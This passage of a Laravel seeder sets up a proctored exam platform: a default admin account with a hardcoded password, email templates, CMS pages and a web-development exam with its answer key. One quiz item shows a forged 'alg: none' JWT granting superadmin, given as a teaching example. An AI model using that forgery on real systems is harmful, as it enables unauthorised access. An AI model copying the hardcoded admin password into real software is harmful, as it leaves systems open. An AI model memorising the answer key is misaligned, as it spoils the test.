<?php

namespace Database\Seeders;

use App\Models\CmsPage;
use App\Models\EmailTemplate;
use App\Models\Exam;
use App\Models\Question;
use App\Models\QuestionOption;
use App\Models\SystemSetting;
use App\Models\User;
use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class DatabaseSeeder extends Seeder
{
    /**
     * Seed the application's database with default admin credentials,
     * system email templates, CMS pages, and the 20-question CSC 455 exam.
     */
    public function run(): void
    {
        // 1. Default Admin Credentials
        $admin = User::updateOrCreate(
            ['email' => 'admin@examcms.test'],
            [
                'name' => 'System Administrator',
                'password' => Hash::make('AdminSecret2026!'),
                'role' => 'admin',
                'status' => 'active',
                'email_verified_at' => now(),
            ]
        );

        // 2. Global System Settings (Dynamic SMTP, SEO, Proctoring Defaults)
        $settings = [
            // Dynamic SMTP Defaults
            ['key' => 'mail_mailer', 'value' => 'log', 'group' => 'smtp', 'type' => 'string'],
            ['key' => 'mail_host', 'value' => '127.0.0.1', 'group' => 'smtp', 'type' => 'string'],
            ['key' => 'mail_port', 'value' => '2525', 'group' => 'smtp', 'type' => 'integer'],
            ['key' => 'mail_username', 'value' => '', 'group' => 'smtp', 'type' => 'string'],
            ['key' => 'mail_password', 'value' => '', 'group' => 'smtp', 'type' => 'string', 'is_secret' => true],
            ['key' => 'mail_encryption', 'value' => 'tls', 'group' => 'smtp', 'type' => 'string'],
            ['key' => 'mail_from_address', 'value' => 'proctor@examcms.test', 'group' => 'smtp', 'type' => 'string'],
            ['key' => 'mail_from_name', 'value' => 'ProctorGuard Assessment Engine', 'group' => 'smtp', 'type' => 'string'],
            ['key' => 'admin_alert_email', 'value' => 'admin@examcms.test', 'group' => 'smtp', 'type' => 'string'],

            // Global SEO Parameters
            ['key' => 'site_name', 'value' => 'ProctorGuard Exam CMS', 'group' => 'seo', 'type' => 'string'],
            ['key' => 'seo_title_default', 'value' => 'ProctorGuard - Enterprise Quiz & Proctoring CMS', 'group' => 'seo', 'type' => 'string'],
            ['key' => 'seo_description_default', 'value' => 'Enterprise-grade anti-cheat quiz and examination platform with HTML5 canvas pixel buffer rendering and forensic dynamic watermarking.', 'group' => 'seo', 'type' => 'text'],
            ['key' => 'seo_keywords_default', 'value' => 'proctoring, online exam, anti-cheat, canvas proctor, quiz cms, laravel 11', 'group' => 'seo', 'type' => 'string'],
            ['key' => 'seo_og_image', 'value' => '', 'group' => 'seo', 'type' => 'string'],
            ['key' => 'seo_robots', 'value' => 'index, follow', 'group' => 'seo', 'type' => 'string'],

            // Proctoring Engine Defaults
            ['key' => 'default_max_strikes', 'value' => '3', 'group' => 'proctoring', 'type' => 'integer'],
            ['key' => 'default_strictness', 'value' => 'strict', 'group' => 'proctoring', 'type' => 'string'],
            ['key' => 'watermark_opacity', 'value' => '0.12', 'group' => 'proctoring', 'type' => 'string'],
        ];

        foreach ($settings as $setting) {
            SystemSetting::updateOrCreate(
                ['key' => $setting['key']],
                $setting
            );
        }

        // 3. System Email Templates
        // A) Student Score Report
        EmailTemplate::updateOrCreate(
            ['template_key' => 'student_score_report'],
            [
                'name' => 'Official Student Examination Score Report',
                'subject' => 'Examination Score Report: {exam_title} - {student_name}',
                'is_active' => true,
                'placeholders' => [
                    'student_name', 'student_id', 'exam_title', 'course_code',
                    'score', 'max_score', 'percentage', 'pass_percentage',
                    'status_text', 'status_badge', 'submission_date', 'ip_address', 'strikes_count'
                ],
                'body_html' => '
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, sans-serif; background-color: #0b1120; color: #f8fafc; padding: 40px 15px; margin: 0;">
    <div style="max-width: 600px; margin: 0 auto; background: #0f172a; border: 1px solid #1e293b; border-radius: 20px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);">
        <div style="background: linear-gradient(135deg, #4f46e5, #7c3aed); padding: 35px 30px; text-align: center;">
            <div style="font-size: 11px; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; color: #e0e7ff; margin-bottom: 8px;">Official Assessment Transcript</div>
            <h1 style="color: #ffffff; margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -0.5px;">{exam_title}</h1>
            <p style="color: #c7d2fe; margin: 6px 0 0; font-size: 13px;">Course Code: {course_code}</p>
        </div>

        <div style="padding: 35px 30px;">
            <div style="text-align: center; margin-bottom: 30px;">
                <div style="margin-bottom: 15px;">{status_badge}</div>
                <div style="font-size: 42px; font-weight: 900; color: #ffffff; font-family: monospace;">{percentage}%</div>
                <div style="font-size: 13px; color: #94a3b8; margin-top: 4px;">Points: <strong>{score}</strong> out of <strong>{max_score}</strong> possible (Passing: {pass_percentage}%)</div>
            </div>

            <div style="background: #1e293b; border-radius: 12px; padding: 20px; margin-bottom: 25px;">
                <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
                    <tr>
                        <td style="padding: 6px 0; color: #94a3b8;">Candidate Name:</td>
                        <td style="padding: 6px 0; color: #ffffff; font-weight: bold; text-align: right;">{student_name}</td>
                    </tr>
                    <tr>
                        <td style="padding: 6px 0; color: #94a3b8;">Student ID Code:</td>
                        <td style="padding: 6px 0; color: #818cf8; font-family: monospace; font-weight: bold; text-align: right;">{student_id}</td>
                    </tr>
                    <tr>
                        <td style="padding: 6px 0; color: #94a3b8;">Submission Timestamp:</td>
                        <td style="padding: 6px 0; color: #ffffff; text-align: right;">{submission_date}</td>
                    </tr>
                    <tr>
                        <td style="padding: 6px 0; color: #94a3b8;">Client IP Address:</td>
                        <td style="padding: 6px 0; color: #cbd5e1; font-family: monospace; text-align: right;">{ip_address}</td>
                    </tr>
                    <tr>
                        <td style="padding: 6px 0; color: #94a3b8;">Security Strikes Logged:</td>
                        <td style="padding: 6px 0; color: #38bdf8; font-weight: bold; text-align: right;">{strikes_count} strikes</td>
                    </tr>
                </table>
            </div>

            <p style="font-size: 12px; color: #64748b; line-height: 1.6; text-align: center; margin: 0;">
                This examination was proctored via ProctorGuard Enterprise with canvas pixel buffer rasterization and dynamic cryptographic forensic watermarking.
            </p>
        </div>
    </div>
</body>
</html>'
            ]
        );

        // B) Administrator High-Priority Cheat Alert
        EmailTemplate::updateOrCreate(
            ['template_key' => 'admin_strike_alert'],
            [
                'name' => 'High-Priority Administrator Proctoring Infraction Alert',
                'subject' => '[URGENT PROCTOR ALERT] Infraction Strike {strike_number}/{max_strikes}: {student_name} ({course_code})',
                'is_active' => true,
                'placeholders' => [
                    'student_name', 'student_id', 'student_email', 'exam_title',
                    'course_code', 'infraction_type', 'severity', 'strike_number',
                    'max_strikes', 'status', 'details', 'ip_address', 'timestamp'
                ],
                'body_html' => '
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, sans-serif; background-color: #1e111a; color: #f8fafc; padding: 40px 15px; margin: 0;">
    <div style="max-width: 600px; margin: 0 auto; background: #26111f; border: 2px solid #e11d48; border-radius: 20px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(225, 29, 72, 0.4);">
        <div style="background: #e11d48; padding: 25px 30px; text-align: center; color: #ffffff;">
            <div style="font-size: 11px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase;">Proctoring Perimeter Alert</div>
            <h1 style="margin: 6px 0 0; font-size: 22px; font-weight: 900;">SECURITY INFRACTION DETECTED</h1>
        </div>

        <div style="padding: 30px;">
            <div style="background: #3b1227; border: 1px solid #f43f5e; border-radius: 12px; padding: 20px; margin-bottom: 25px;">
                <p style="margin: 0 0 10px; font-size: 14px; font-weight: bold; color: #fecdd3;">Violation Summary:</p>
                <p style="margin: 0; font-size: 16px; font-weight: bold; color: #ffffff;">{infraction_type}</p>
                <div style="margin-top: 10px; font-size: 12px; color: #fda4af; font-family: monospace;">Details: {details}</div>
            </div>

            <table style="width: 100%; border-collapse: collapse; font-size: 13px; margin-bottom: 25px;">
                <tr>
                    <td style="padding: 8px 0; color: #fda4af; border-bottom: 1px solid #4c1d3d;">Candidate:</td>
                    <td style="padding: 8px 0; color: #ffffff; font-weight: bold; text-align: right; border-bottom: 1px solid #4c1d3d;">{student_name} ({student_id})</td>
                </tr>
                <tr>
                    <td style="padding: 8px 0; color: #fda4af; border-bottom: 1px solid #4c1d3d;">Candidate Email:</td>
                    <td style="padding: 8px 0; color: #ffffff; text-align: right; border-bottom: 1px solid #4c1d3d;">{student_email}</td>
                </tr>
                <tr>
                    <td style="padding: 8px 0; color: #fda4af; border-bottom: 1px solid #4c1d3d;">Assessment:</td>
                    <td style="padding: 8px 0; color: #ffffff; text-align: right; border-bottom: 1px solid #4c1d3d;">{exam_title} ({course_code})</td>
                </tr>
                <tr>
                    <td style="padding: 8px 0; color: #fda4af; border-bottom: 1px solid #4c1d3d;">Strike Number:</td>
                    <td style="padding: 8px 0; color: #f43f5e; font-weight: 900; font-size: 15px; text-align: right; border-bottom: 1px solid #4c1d3d;">{strike_number} of {max_strikes}</td>
                </tr>
                <tr>
                    <td style="padding: 8px 0; color: #fda4af; border-bottom: 1px solid #4c1d3d;">Session Status:</td>
                    <td style="padding: 8px 0; color: #f43f5e; font-weight: bold; text-align: right; border-bottom: 1px solid #4c1d3d;">{status}</td>
                </tr>
                <tr>
                    <td style="padding: 8px 0; color: #fda4af; border-bottom: 1px solid #4c1d3d;">Client IP Address:</td>
                    <td style="padding: 8px 0; color: #cbd5e1; font-family: monospace; text-align: right; border-bottom: 1px solid #4c1d3d;">{ip_address}</td>
                </tr>
                <tr>
                    <td style="padding: 8px 0; color: #fda4af;">Incident Timestamp:</td>
                    <td style="padding: 8px 0; color: #ffffff; text-align: right;">{timestamp}</td>
                </tr>
            </table>

            <p style="font-size: 11px; color: #9f1239; line-height: 1.5; text-align: center; margin: 0;">
                If strikes reach {max_strikes}, the student session is automatically locked, terminated, and scored at 0.00%. Proctors can review or intervene directly from the Live Proctoring Ledger.
            </p>
        </div>
    </div>
</body>
</html>'
            ]
        );

        // 4. Default CMS Pages
        // A) Homepage with modular widgets
        CmsPage::updateOrCreate(
            ['slug' => 'home'],
            [
                'title' => 'Secure Examination Portal',
                'is_home' => true,
                'status' => 'published',
                'seo_title' => 'ProctorGuard - Enterprise Anti-Cheat Examination Platform',
                'seo_description' => 'Zero-leakage proctored examinations with HTML5 canvas pixel buffer rendering and live forensic watermarking.',
                'seo_keywords' => 'proctoring, online exam, canvas proctor, anti-cheat, csc 455, web development',
                'content_widgets' => [
                    [
                        'type' => 'hero',
                        'headline' => 'Next-Generation Secure Examination Platform',
                        'subhead' => 'Enterprise-grade anti-cheat proctoring engine with HTML5 canvas pixel rasterization to defeat AI scraping extensions, tab switching, and photo leaking.',
                        'button_text' => 'Take Assessment',
                        'button_url' => '#active-exams',
                    ],
                    [
                        'type' => 'features',
                        'title' => 'Enterprise Anti-Cheat Architecture',
                        'raw_items' => "Canvas Pixel Buffer Rendering | Question prompts and code snippets are rendered inside HTML5 canvas pixel buffers, leaving no readable DOM text for AI browser extensions or screen scrapers to intercept.\nLive Dynamic Forensic Watermark | Repeating diagonal watermark stamps the candidate's legal name, student ID, IP address, and live ticking UTC timestamp across all screen pixels to make photo leaks instantly traceable.\nSynchronized Waiting Room | Candidates assemble in real time awaiting proctor authorization. Questions release simultaneously with zero page reloads.\nEnforced Client Hardening | Intercepts F12 inspect shortcuts, docked DevTools panels, tab visibility loss, window blurs, and right-click context menus with automatic strike scoring.",
                    ],
                    [
                        'type' => 'cta',
                        'title' => 'Need Testing Accommodations or Candidate Support?',
                        'message' => 'Reach out to the University Examination Board for accommodation requests, hardware checks, or scheduling questions.',
                        'button_text' => 'Submit Candidate Inquiry',
                    ]
                ],
            ]
        );

        // B) Rules & Code of Conduct Page
        CmsPage::updateOrCreate(
            ['slug' => 'rules'],
            [
                'title' => 'Examination Rules & Integrity Code',
                'is_home' => false,
                'status' => 'published',
                'seo_title' => 'Candidate Integrity Code & Examination Rules - ProctorGuard',
                'seo_description' => 'Mandatory rules, prohibited behaviors, and proctoring perimeter protocols for candidates.',
                'seo_keywords' => 'exam rules, proctoring guidelines, academic integrity, cheat penalties',
                'content_widgets' => [
                    [
                        'type' => 'hero',
                        'headline' => 'Candidate Examination Protocol & Integrity Rules',
                        'subhead' => 'Please read all rules thoroughly before accessing your proctored assessment session.',
                        'button_text' => 'Return to Assessment Portal',
                        'button_url' => '/',
                    ],
                    [
                        'type' => 'accordion',
                        'title' => 'Frequently Asked Questions & Enforcement Guidelines',
                        'raw_items' => "Can I switch browser tabs or open other desktop applications? | Strictly prohibited. Switching tabs or clicking outside the examination window triggers a High-Severity Infraction Strike.\nIs Fullscreen mode mandatory? | Yes. You must remain in full-screen mode for the duration of the test. Exiting fullscreen logs a strike.\nWhat happens if Developer Tools or Inspect elements are opened? | Opening browser Developer Tools, pressing F12, or launching debugger panels immediately accrues strikes and may trigger immediate session disqualification.\nHow does the Forensic Watermark work? | A semi-transparent overlay displays your legal name, student ID, client IP address, and live UTC timestamp. Capturing photos of the screen embeds an unbreakable digital watermark tracing the leak directly to your identity.\nWhat happens if I reach the maximum strike limit? | Upon reaching the strike limit (default 3), the session is terminated instantly, scored at 0.00%, and an urgent security report is dispatched to university proctors.\nAre reference materials permitted? | Unless specifically specified in the exam instructions, all outside references, calculators, and AI tools are prohibited.",
                    ],
                    [
                        'type' => 'form_embed',
                        'heading' => 'Need Testing Accommodations or Assistance?',
                        'form_name' => 'accommodations',
                    ]
                ],
            ]
        );

        // 5. Pre-Populated 20-Question CSC 455 Web Development Examination
        $exam = Exam::updateOrCreate(
            ['slug' => 'csc-455-web-development-final'],
            [
                'title' => 'CSC 455 Advanced Web Development Final Examination',
                'course_code' => 'CSC 455',
                'description' => 'Comprehensive evaluation of advanced web architecture, modern PHP 8.3 features, JavaScript runtime mechanics, RESTful API design, database indexing strategies, and web security engineering.',
                'instructions' => "1. Time limit: 45 Minutes.\n2. All questions are multiple choice or code output analysis.\n3. The anti-cheat proctoring engine actively monitors focus and fullscreen integrity.\n4. Questions are rendered directly onto an HTML5 canvas pixel buffer.\n5. Any attempt to open DevTools, switch tabs, or exit fullscreen will log infraction strikes.\n6. Exceeding 3 strikes automatically terminates the test with a grade of 0.00%.",
                'duration_minutes' => 45,
                'pass_percentage' => 70.00,
                'max_strikes' => 3,
                'access_passcode' => null,
                'randomize_questions' => true,
                'randomize_options' => true,
                'is_published' => true,
                'is_released' => true, // Released for immediate live testing
                'released_at' => now(),
                'anti_cheat_strictness' => 'strict',
                'enforce_fullscreen' => true,
                'block_clipboard' => true,
                'block_devtools' => true,
                'watermark_enabled' => true,
            ]
        );

        // Clean existing questions if re-seeding
        $exam->questions()->delete();

        // 20 Technical, Real-World Questions
        $questionsData = [
            // Question 1
            [
                'prompt' => 'In HTTP/2 and HTTP/3 architectures, what critical transport-layer bottleneck is solved by HTTP/3 replacing TCP with QUIC over UDP?',
                'code_snippet' => "// HTTP/2 TCP Packet Loss Scenario
[Packet 1 (Stream A)] -> Received
[Packet 2 (Stream B)] -> DROPPED (Retransmission Required)
[Packet 3 (Stream C)] -> BLOCKED waiting for Packet 2",
                'language' => 'bash',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'In HTTP/2, all multiplexed streams share a single TCP connection. When a packet drops, all streams halt until retransmission finishes (TCP Head-of-Line blocking). QUIC over UDP isolates streams so packet loss in one stream never stalls other streams.',
                'options' => [
                    ['text' => 'TCP Head-of-Line (HoL) blocking where a dropped packet halts all concurrent multiplexed streams.', 'is_correct' => true],
                    ['text' => 'TLS handshakes requiring 4 round trips instead of zero round-trip resumption.', 'is_correct' => false],
                    ['text' => 'Inability of TCP to utilize gzip compression for response body payloads.', 'is_correct' => false],
                    ['text' => 'HTTP header repetition resolved exclusively by HPACK dictionary algorithms.', 'is_correct' => false],
                ]
            ],

            // Question 2
            [
                'prompt' => 'In modern browser cookie security, what is the exact operational distinction between SameSite=Strict and SameSite=Lax when a user navigates to your application from an external link (e.g. clicking a link in an email)?',
                'code_snippet' => "// Cookie Header Setting
Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=???",
                'language' => 'php',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'With SameSite=Strict, cookies are withheld on all cross-site requests, including top-level GET navigations from external links. With SameSite=Lax, cookies are sent on safe top-level GET navigations, but withheld on cross-site POST requests.',
                'options' => [
                    ['text' => 'SameSite=Lax sends the cookie on top-level GET navigations from third-party sites, whereas SameSite=Strict withholds the cookie on all cross-site requests.', 'is_correct' => true],
                    ['text' => 'SameSite=Strict prevents access from JavaScript document.cookie, while SameSite=Lax permits document.cookie access.', 'is_correct' => false],
                    ['text' => 'SameSite=Lax only functions over unencrypted HTTP, while SameSite=Strict requires HTTPS.', 'is_correct' => false],
                    ['text' => 'SameSite=Strict encrypts the payload on the client, whereas SameSite=Lax hashes the token.', 'is_correct' => false],
                ]
            ],

            // Question 3
            [
                'prompt' => 'Consider the following PHP 8.3 class definition. What will happen when instantiateAndModify() is executed in a PHP 8.3 runtime?',
                'code_snippet' => "readonly class UserProfile {
    public function __construct(
        public string \$username,
        public array \$roles
    ) {}
}

function instantiateAndModify(): void {
    \$profile = new UserProfile('alex_vance', ['editor']);
    \$profile->roles[] = 'admin';
    echo count(\$profile->roles);
}",
                'language' => 'php',
                'question_type' => 'code_output',
                'points' => 1,
                'explanation' => 'In PHP 8.2/8.3, readonly classes prevent any modification to initialized properties, including mutating arrays via bracket append ($profile->roles[] = ...), throwing an Error: Cannot modify readonly property.',
                'options' => [
                    ['text' => 'Fatal Error: Cannot modify readonly property UserProfile::$roles', 'is_correct' => true],
                    ['text' => 'Outputs: 2', 'is_correct' => false],
                    ['text' => 'Outputs: 1 with a Deprecation Notice', 'is_correct' => false],
                    ['text' => 'Warning: Attempt to modify property of non-object', 'is_correct' => false],
                ]
            ],

            // Question 4
            [
                'prompt' => 'To defend against Cross-Site Scripting (XSS) while allowing legitimate inline scripts, which Content Security Policy (CSP) directive represents the most resilient modern standard recommended by OWASP and Google Security?',
                'code_snippet' => "Content-Security-Policy: script-src 'strict-dynamic' 'nonce-R4nd0mStr1ng' 'unsafe-inline' http: https:;",
                'language' => 'bash',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'The CSP directive using \'strict-dynamic\' with a cryptographic nonce ensures that only scripts explicitly tagged with the matching one-time server-generated nonce (and scripts loaded by those scripts) are permitted to execute, ignoring \'unsafe-inline\' and domain whitelists in modern browsers.',
                'options' => [
                    ['text' => "Nonce-based CSP with 'strict-dynamic' where each request provides a unique cryptographic nonce.", 'is_correct' => true],
                    ['text' => "Domain-based CSP allowing 'unsafe-inline' and wildcard https://*.cdn.com domains.", 'is_correct' => false],
                    ['text' => "Disabling all script execution entirely via sandbox allow-same-origin directives.", 'is_correct' => false],
                    ['text' => "Relying on the browser's built-in X-XSS-Protection header set to mode=block.", 'is_correct' => false],
                ]
            ],

            // Question 5
            [
                'prompt' => 'Analyze the following JavaScript snippet. In what exact order will the numbers be logged to the console by the JavaScript V8 event loop?',
                'code_snippet' => "console.log(1);

setTimeout(() => console.log(2), 0);

Promise.resolve().then(() => console.log(3));

queueMicrotask(() => console.log(4));

console.log(5);",
                'language' => 'javascript',
                'question_type' => 'code_output',
                'points' => 1,
                'explanation' => 'Synchronous code runs first (1, 5). Next, all microtasks in the microtask queue are drained in order before rendering or macrotasks (3 from Promise.then, 4 from queueMicrotask). Finally, the macrotask timer callback executes (2). Sequence is: 1, 5, 3, 4, 2.',
                'options' => [
                    ['text' => '1, 5, 3, 4, 2', 'is_correct' => true],
                    ['text' => '1, 2, 3, 4, 5', 'is_correct' => false],
                    ['text' => '1, 5, 2, 3, 4', 'is_correct' => false],
                    ['text' => '1, 3, 4, 5, 2', 'is_correct' => false],
                ]
            ],

            // Question 6
            [
                'prompt' => 'Why does using parameterized prepared statements fundamentally eliminate SQL injection vulnerabilities compared to manual string escaping (such as addslashes or mysqli_real_escape_string)?',
                'code_snippet' => "// Prepared Statement
\$stmt = \$pdo->prepare('SELECT * FROM users WHERE email = :email AND status = :status');
\$stmt->execute(['email' => \$inputEmail, 'status' => 'active']);",
                'language' => 'php',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'Prepared statements compile and parse the SQL query syntax tree on the database server before data values are supplied. The parameters are transmitted out-of-band as raw literal values, meaning input can never alter query structure or syntax regardless of quotation marks or characters.',
                'options' => [
                    ['text' => 'The SQL grammar and query tree are pre-compiled by the database engine prior to binding parameter values, preventing data from ever altering the AST structure.', 'is_correct' => true],
                    ['text' => 'PDO performs internal regex validation that strips quotation characters from incoming strings.', 'is_correct' => false],
                    ['text' => 'Prepared statements automatically encrypt query parameters using AES-256 before sending over TCP.', 'is_correct' => false],
                    ['text' => 'The database converts all user input parameters into base64 strings during execution.', 'is_correct' => false],
                ]
            ],

            // Question 7
            [
                'prompt' => 'In Laravel’s Service Container (IoC), what is the architectural difference between using $this->app->singleton(...) versus $this->app->bind(...) in a ServiceProvider?',
                'code_snippet' => "// Service Provider Binding
\$this->app->singleton(PaymentGateway::class, function (\$app) {
    return new StripePaymentGateway(config('services.stripe.secret'));
});",
                'language' => 'php',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'app->bind() registers a resolution callback that instantiates a fresh new instance every time the class is resolved. app->singleton() resolves the class once and caches the instance for subsequent resolutions across the lifecycle of that request.',
                'options' => [
                    ['text' => 'singleton() resolves the class once and returns the cached instance on subsequent resolutions within the request lifecycle, while bind() creates a new instance on every call.', 'is_correct' => true],
                    ['text' => 'singleton() is only available in console commands, whereas bind() works in HTTP controllers.', 'is_correct' => false],
                    ['text' => 'bind() caches the instance in Redis, while singleton() caches in PHP APCu memory.', 'is_correct' => false],
                    ['text' => 'singleton() automatically creates a database transaction around class methods.', 'is_correct' => false],
                ]
            ],

            // Question 8
            [
                'prompt' => 'Why does drawing question prompts and code snippets into an HTML5 Canvas pixel buffer render browser AI extension scrapers (e.g. ChatGPT sidebars, Monica, Copilot) technically unable to auto-solve tests?',
                'code_snippet' => "// Canvas Rendering
const ctx = canvas.getContext('2d');
ctx.fillText('Calculate time complexity of merge sort:', 50, 100);
// Result: Stored as bitmap array in Canvas pixel buffer",
                'language' => 'javascript',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'Browser extensions inspect DOM element trees (e.g., querySelectorAll("p, pre, code")). Canvas 2D rasterizes characters directly into raw RGB/RGBA pixel buffers, meaning there are no text nodes or string elements anywhere in the DOM tree for extensions to read.',
                'options' => [
                    ['text' => 'Canvas rasterizes text into raw RGBA pixel arrays, meaning no string or text nodes exist in the DOM tree for browser extensions to inspect.', 'is_correct' => true],
                    ['text' => 'Canvas elements automatically block all Chrome extension API permissions.', 'is_correct' => false],
                    ['text' => 'Canvas requires WebAssembly execution which browser extensions cannot observe.', 'is_correct' => false],
                    ['text' => 'Canvas elements encrypt their coordinate data using client-side SHA-256 hashes.', 'is_correct' => false],
                ]
            ],

            // Question 9
            [
                'prompt' => 'In Single Page Applications (SPAs) and mobile clients, why did OAuth 2.1 officially deprecate the Implicit Grant flow in favor of Authorization Code Flow with PKCE (Proof Key for Code Exchange)?',
                'code_snippet' => "// PKCE Flow
code_verifier = random_bytes(64)
code_challenge = BASE64URL(SHA256(code_verifier))",
                'language' => 'bash',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'Implicit Grant exposed raw access tokens directly in URL fragments (#access_token=...), leading to token leakage via browser history, Referer headers, and proxy logs. PKCE allows public clients (which cannot store a client_secret) to safely exchange an auth code without token interception risks.',
                'options' => [
                    ['text' => 'Implicit flow returns access tokens directly in URI fragment hashes where they leak via browser history and Referer headers; PKCE securely validates code exchange without requiring a stored client secret.', 'is_correct' => true],
                    ['text' => 'Implicit flow is limited to a maximum token lifetime of 30 seconds.', 'is_correct' => false],
                    ['text' => 'PKCE requires hardware security keys (FIDO2) whereas Implicit did not.', 'is_correct' => false],
                    ['text' => 'Implicit flow is incompatible with JSON Web Tokens (JWT).', 'is_correct' => false],
                ]
            ],

            // Question 10
            [
                'prompt' => 'In modern responsive CSS, what is the fundamental layout model difference between CSS Grid and CSS Flexbox?',
                'code_snippet' => "/* Container A */
display: grid;
grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));

/* Container B */
display: flex;
flex-wrap: wrap;",
                'language' => 'html',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'CSS Grid is two-dimensional (simultaneously controls rows AND columns), aligning items along horizontal and vertical tracks. Flexbox is one-dimensional (content-first layout along either the main axis OR cross axis, but not both simultaneously).',
                'options' => [
                    ['text' => 'CSS Grid is two-dimensional (manages rows and columns simultaneously), while Flexbox is one-dimensional (manages layout along a single main axis).', 'is_correct' => true],
                    ['text' => 'CSS Grid only supports fixed pixel measurements, whereas Flexbox supports fractional units.', 'is_correct' => false],
                    ['text' => 'Flexbox performs hardware acceleration on the GPU, while CSS Grid runs on the CPU thread.', 'is_correct' => false],
                    ['text' => 'CSS Grid cannot wrap items onto new lines, requiring media queries for responsiveness.', 'is_correct' => false],
                ]
            ],

            // Question 11
            [
                'prompt' => 'When architecting real-time web services, under which scenario is Server-Sent Events (SSE) architecturally superior and more efficient than WebSockets?',
                'code_snippet' => "// Server-Sent Events Header
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive",
                'language' => 'bash',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'Server-Sent Events operates over standard HTTP/1.1 or HTTP/2, supports automatic browser reconnection and event IDs natively, and is ideal for unidirectional server-to-client streaming (e.g. LLM streaming, live dashboards). WebSockets introduces stateful TCP duplex overhead which is unnecessary when client responses are regular HTTP requests.',
                'options' => [
                    ['text' => 'When communication is strictly unidirectional (server-to-client streaming), as SSE runs over standard HTTP, multiplexes over HTTP/2, and handles auto-reconnection natively.', 'is_correct' => true],
                    ['text' => 'When high-frequency binary audio and video data must be transmitted bidirectionally.', 'is_correct' => false],
                    ['text' => 'When legacy browsers without JavaScript support need live updates.', 'is_correct' => false],
                    ['text' => 'When the client must initiate 1,000 messages per second back to the server.', 'is_correct' => false],
                ]
            ],

            // Question 12
            [
                'prompt' => 'In JWT (JSON Web Tokens) verification, what critical vulnerability occurs when an API gateway or backend accepts the "none" algorithm header without strict server-side policy enforcement?',
                'code_snippet' => "// Attacker-crafted JWT Header
{
  \"alg\": \"none\",
  \"typ\": \"JWT\"
}.
// Payload with escalated privileges
{
  \"sub\": \"12345\",
  \"role\": \"superadmin\"
}.",
                'language' => 'javascript',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'The "alg: none" vulnerability occurs when verification libraries accept tokens whose header specifies no signature algorithm is required. Attackers can forge arbitrary administrative payloads and omit the cryptographic signature entirely, bypassing authentication if unvalidated.',
                'options' => [
                    ['text' => 'The backend treats the token as valid without verifying any cryptographic signature, allowing attackers to forge arbitrary claims and escalate privileges.', 'is_correct' => true],
                    ['text' => 'The server leaks its private RSA key inside the HTTP response body.', 'is_correct' => false],
                    ['text' => 'The token payload is exposed in plain text over the network.', 'is_correct' => false],
                    ['text' => 'The database connection pool is immediately exhausted through recursive verification.', 'is_correct' => false],
                ]
            ],

            // Question 13
            [
                'prompt' => 'Given a MySQL table with a composite B-Tree index on (tenant_id, created_at, status), which of the following WHERE clauses CANNOT fully utilize this composite index due to the Leftmost Prefix Rule?',
                'code_snippet' => "-- Composite Index
CREATE INDEX idx_tenant_time_status ON orders (tenant_id, created_at, status);",
                'language' => 'sql',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'B-Tree composite indexes can only be searched starting from the leftmost column. A query filtering only on `created_at` and `status` skips `tenant_id`, meaning the database cannot seek within the index tree and must perform a full index scan or full table scan.',
                'options' => [
                    ['text' => "SELECT * FROM orders WHERE created_at = '2026-10-01' AND status = 'shipped'", 'is_correct' => true],
                    ['text' => "SELECT * FROM orders WHERE tenant_id = 42 AND created_at >= '2026-10-01'", 'is_correct' => false],
                    ['text' => "SELECT * FROM orders WHERE tenant_id = 42 AND created_at = '2026-10-01' AND status = 'pending'", 'is_correct' => false],
                    ['text' => "SELECT * FROM orders WHERE tenant_id = 42", 'is_correct' => false],
                ]
            ],

            // Question 14
            [
                'prompt' => 'Under the Cross-Origin Resource Sharing (CORS) specification, which HTTP request scenario will NOT trigger an automatic preflight OPTIONS request by the browser?',
                'code_snippet' => "// Browser Fetch Request
fetch('https://api.partner.com/v1/data', {
    method: '???',
    headers: { '???' : '???' }
});",
                'language' => 'javascript',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'Simple requests do not trigger a CORS preflight OPTIONS check. A simple request uses GET, HEAD, or POST, and only contains CORS-safelisted headers (Accept, Accept-Language, Content-Language, or Content-Type set to application/x-www-form-urlencoded, multipart/form-data, or text/plain). Content-Type: application/json triggers a preflight.',
                'options' => [
                    ['text' => 'A POST request with Content-Type: application/x-www-form-urlencoded and standard Accept headers.', 'is_correct' => true],
                    ['text' => 'A POST request with Content-Type: application/json.', 'is_correct' => false],
                    ['text' => 'A GET request containing a custom Authorization: Bearer token header.', 'is_correct' => false],
                    ['text' => 'A PUT request modifying an existing resource.', 'is_correct' => false],
                ]
            ],

            // Question 15
            [
                'prompt' => 'In PHP 8.x, how does the modern match expression differ from the traditional switch statement in both comparison strictness and control flow behavior?',
                'code_snippet' => "// Modern PHP Match Expression
\$result = match (\$status) {
    200, 201 => 'Success',
    400 => 'Bad Request',
    default => 'Unknown Status'
};",
                'language' => 'php',
                'question_type' => 'multiple_choice',
                'points' => 1,
